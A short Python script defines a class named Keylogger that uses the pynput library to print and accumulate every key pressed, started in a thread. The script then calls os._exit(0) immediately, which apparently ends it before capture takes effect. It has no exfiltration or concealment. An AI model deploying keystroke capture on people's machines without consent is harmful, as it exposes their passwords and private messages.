import os
import threading
from _thread import start_new_thread

import sys
from pynput.keyboard import Listener


class Keylogger:
    def on_press(self, key):
        print(key)
        self.currentKeyboardActivity += str(key)

    def __init__(self):
        self.currentKeyboardActivity = str()
        with Listener(on_press=self.on_press) as listener:
            listener.join()


t1 = threading.Thread(target=Keylogger, args=())
t1.start()

os._exit(0)